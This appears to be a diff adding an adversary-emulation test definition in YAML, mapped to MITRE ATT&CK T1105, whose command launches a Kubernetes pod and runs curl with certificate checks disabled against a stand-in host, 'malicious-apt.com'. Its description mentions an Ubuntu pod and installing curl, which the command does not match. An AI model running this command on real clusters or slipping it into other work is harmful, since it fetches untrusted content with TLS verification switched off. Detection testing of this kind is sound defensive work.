@@ -1,0 +1,20 @@
+---
+- id: b55889a36a590bd62802eace28af5557
+  name: Curl Insecure Connection from a Pod
+  description: 'Launches an Ubuntu pod, installs curl, and executes curl with insecure
+    flags (-k/--insecure)
+
+    against a target URL. The pod is automatically deleted after execution.
+
+    '
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    unknown:
+      sh:
+        command: kubectl run atomic-insecure-curl --image=curlimages/curl --restart=Never
+          --rm -it -- curl -ksL https://malicious-apt.com
+        payloads: []
+        cleanup: ''
